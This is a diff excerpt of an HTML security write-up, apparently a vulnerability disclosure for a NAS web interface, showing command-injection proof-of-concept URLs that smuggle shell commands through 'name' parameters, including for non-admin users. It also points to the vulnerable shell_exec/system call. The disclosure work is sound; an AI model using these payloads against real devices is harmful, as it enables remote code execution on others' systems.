@@ -353,9 +353,9 @@ include_once <span style="color:#ed9d13">&#34;include/app.php&#34;</span>;
 I could not find anything like that, what I could find is instead an interesting function which accepts user input and result in an RCE if reached by an <strong>admin</strong> user:</p>
 <pre tabindex="0"><code>http://nas:8181/tos/index.php?app/app_start_stop&amp;id=transmission&amp;start=0&amp;name=Transmission.*.oexe;ls%3E/tmp/xxx.txt;ls
 </code></pre><p>And a couple which work from <strong>non-admin</strong> users as well, these do not conviniently provide an output in the response, but nonetheless they stillexecute our commands:</p>
-<pre tabindex="0"><code>http://192.168.2.201:8181/tos/index.php?app/del&amp;id=0&amp;name=;ls%3E/tmp/xyz.txt;ls%23
+<pre tabindex="0"><code>http://nas:8181/tos/index.php?app/del&amp;id=0&amp;name=;ls%3E/tmp/xyz.txt;ls%23
 
-http://192.168.2.201:8181/tos/index.php?app/hand_app&amp;name=;ls%3E/tmp/kjl.txt;ls.tpk
+http://nas:8181/tos/index.php?app/hand_app&amp;name=;ls%3E/tmp/kjl.txt;ls.tpk
 </code></pre><p>All have a similar issue, user input is inserted into a string executed by either <code>shell_exec()</code> or <code>system()</code>, I will provide one example below, the function <code>app/del</code> at <code>tos/controller/app.class.php</code>:</p>
 <div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#6ab825;font-weight:bold">public</span> <span style="color:#6ab825;font-weight:bold">function</span> <span style="color:#447fcf">del</span>() {
     <span style="color:#40ffff">$this</span>-&gt;<span style="color:#bbb">init_sql</span>();
